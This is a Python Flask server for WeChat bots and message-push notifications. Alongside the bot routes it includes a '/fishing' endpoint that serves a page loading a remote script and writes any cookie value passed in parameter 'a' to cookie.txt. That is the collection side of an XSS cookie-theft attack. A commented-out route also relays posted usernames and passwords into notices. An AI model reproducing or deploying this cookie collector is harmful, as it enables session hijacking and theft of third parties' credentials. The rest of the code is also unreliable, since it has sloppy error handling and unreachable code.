#!coding=utf-8
import json
from flask import Flask,request,render_template
from wechat import robot,cgddgc
from werobot.contrib.flask import make_view
import weclient as wc
from wxcfg import RobotConfig,cgddgcConfig


app = Flask(__name__)
'''
@app.route('/',methods=['GET', 'POST'])
def msg_push():
    if request.method=='POST':
        user=request.form['user']
        pwd=request.form['pwd']
        wc.sent_notice(user,pwd)
        return user+pwd
    else:
        return 'error'


app.add_url_rule(rule='/werobot/',endpoint='robot',view_func=make_view(robot),methods=['GET', 'POST'])
'''


@app.route('/push/',methods=['GET', 'POST'])
def msg_push():
    if request.method=='POST':
        #print(request.form['%TITLE'])
        #print(request.form['%CONTENT'])
        #print(request.form)
        #print(type(request.values))
        #print(request.values)
        raw_data=request.get_data()
        #print(raw_data)
        data=str(raw_data,encoding="utf-8")
        try:
            dic=json.loads(data.replace('\'','\"'))
            fmt=data.replace('\'','').replace(',','\n').replace('{','').replace('}','')
            #print(fmt)
            wc.sent_notice(fmt)
            return fmt
            
        except Exception as e:
            print(e)
            return e
        #print(request.values.get('%TITLE'))
        #print(request.args.get('%TITLE'))
        #print(request.values.get('%CONTENT'))
        msg=request.values.get('%TITLE')
        print(msg)
        if not (msg=='' or msg==None):
            wc.sent_notice(msg)
        else:
            pass
        
        
    elif request.method=='GET':
        #raw_data=request.args
        #print(raw_data)
        #data=str(raw_data,encoding="utf-8")
        #dic=json.loads(data.replace('\'','\"'))
        #fmt=data.replace('\'','').replace(',','\n').replace('{','').replace('}','')
        #print(fmt)
        #res="<!DOCTYPE html>\n<html>\n<body>\n<script src=\"https://blog.cgddgc.cn/test.js\"></script>\n</body>\n</html>"
        return 'please request by method post'

@app.route('/fishing',methods=['GET'])
def get_cookie():
    res="<!DOCTYPE html>\n<html>\n<body>\n<script src=\"https://blog.cgddgc.cn/test.js\"></script>\n</body>\n</html>"
    if request.method=='GET':
        ck=request.values.get('a')
        #print(request.values)
        if not ck==None:
            with open ('cookie.txt','a') as c:
                c.write(ck)
                c.close()
            return ck
        else:
            return res
    else:
        return "404 Not Found"

@app.route('/status/',methods=['GET'])
def auto_templete():
    user=request.values.get('user')
    return  render_template('index.html',title=user,user=user)
    #return request.values.get('info')

robot.config.from_object(RobotConfig)
app.add_url_rule(rule='/',endpoint='werobot',view_func=make_view(robot),methods=['GET', 'POST'])


cgddgc.config.from_object(cgddgcConfig)
app.add_url_rule(rule='/cgddgc/',endpoint='cgddgc',view_func=make_view(cgddgc),methods=['GET', 'POST'])

if __name__ == '__main__':
    app.run(host='127.0.0.1')
    #app.run(host='0.0.0.0')
